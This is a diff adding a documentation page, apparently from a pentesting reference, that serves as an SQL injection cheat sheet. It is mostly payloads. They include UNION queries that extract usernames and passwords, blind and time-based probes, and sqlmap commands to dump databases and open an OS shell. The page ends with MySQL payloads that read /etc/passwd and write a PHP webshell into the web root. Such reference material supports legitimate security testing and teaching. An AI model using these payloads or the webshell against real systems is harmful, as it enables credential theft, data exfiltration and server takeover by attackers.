@@ -1,0 +1,116 @@
+---
+title: "SQL Injection"
+description: "From data extraction to OS command execution — SQL injection techniques and methodology."
+---
+
+SQL Injection occurs when **user-supplied input is embedded directly into SQL queries** without proper sanitization, allowing an attacker to manipulate the query logic.
+
+## Detecting SQLi
+
+```bash
+# Manual probing — look for errors or behavioral changes
+'
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+```
+
+## Types of SQLi
+
+| Type | Description |
+|---|---|
+| **In-band (Error)** | Error messages reveal DB info |
+| **In-band (Union)** | UNION SELECT extracts data |
+| **Blind (Boolean)** | True/false conditions reveal data |
+| **Blind (Time)** | `SLEEP()` / `WAITFOR` based |
+| **Out-of-band** | DNS/HTTP exfiltration |
+
+## Union-Based Extraction
+
+```sql
+-- Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   -- error means 3 columns exist
+
+-- Find injectable column
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 'a',NULL,NULL--
+
+-- Extract database info
+' UNION SELECT user(),database(),version()--
+
+-- Extract tables
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+-- Extract columns
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+
+-- Extract data
+' UNION SELECT username,password,NULL FROM users--
+```
+
+## Boolean-Based Blind
+
+```sql
+-- Confirm vulnerability
+' AND 1=1--   # True → normal response
+' AND 1=2--   # False → different response
+
+-- Extract data character by character
+' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1--
+```
+
+## Time-Based Blind
+
+```sql
+-- MySQL
+' AND SLEEP(5)--
+
+-- MSSQL
+'; WAITFOR DELAY '0:0:5'--
+
+-- PostgreSQL
+'; SELECT pg_sleep(5)--
+```
+
+## sqlmap
+
+```bash
+# Basic scan
+sqlmap -u "http://target.com/page?id=1"
+
+# POST request
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
+
+# With request file from Burp
+sqlmap -r request.txt
+
+# Dump database
+sqlmap -u "http://target.com/page?id=1" --dump
+
+# OS shell (if privileged)
+sqlmap -u "http://target.com/page?id=1" --os-shell
+```
+
+<Tip>
+  Always use `--level=5 --risk=3` for thorough testing, and `--dbms=mysql` when you know the backend to speed up detection.
+</Tip>
+
+## File Read/Write (MySQL)
+
+```sql
+-- Read a file
+' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+
+-- Write a webshell
+' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
+```
+
+<Warning>
+  File write requires `FILE` privilege and the MySQL user must have write access to the web root.
+</Warning>
